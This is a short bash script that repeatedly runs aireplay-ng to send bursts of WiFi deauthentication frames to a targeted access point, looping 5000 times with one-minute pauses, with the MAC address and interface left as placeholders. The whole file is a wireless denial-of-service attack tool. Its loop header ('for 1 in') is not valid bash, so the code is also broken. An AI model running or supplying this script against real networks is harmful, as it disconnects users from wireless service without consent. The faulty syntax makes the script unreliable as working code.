#! /bin/bash

  for 1 in {1..5000}
  
  do
    aireplay-ng --deauth 1000 -a [AP MAC ADDRESS] [WIRELESS INTERFACE]
    sleep 60s
    
done
